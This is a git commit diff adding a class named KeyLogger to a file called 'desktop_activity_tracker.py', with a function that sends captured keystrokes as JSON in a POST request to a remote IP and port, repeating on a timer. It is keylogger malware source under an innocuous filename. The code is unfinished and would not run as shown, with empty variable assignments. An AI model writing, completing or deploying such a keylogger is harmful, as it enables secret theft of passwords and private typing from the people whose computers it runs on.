2e3a2df2dd9e7cefb45e745d2b76e85a13c6bdfd
Altheo Mananquil <altheo.mananquil@gmail.com>
2025-06-21 23:20:56 +0800

    added function responsible for sending POST request to target server. commit 2

--- desktop_activity_tracker.py
+++ desktop_activity_tracker.py
@@ -1,7 +1,31 @@
-from pynput import keyboard
+class KeyLogger:
 
-import requests
+    from pynput import keyboard
 
-import json
+    import requests
 
-import threading
+    import json
+
+    import threading
+
+
+    # global variable text where keystrokes are saved as a string which is sent to server
+    text = ""
+
+    ip_address =    
+    port_number = 
+    time_interval = 
+
+    def send_post_req():
+        try:
+            payload = json.dumps({"keyboardData": text})
+            
+            req = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
+
+            timer = threading.Timer(time_interval, send_post_req)
+
+            timer.start()
+
+        except:
+            print("Couldn't complete request!")
+
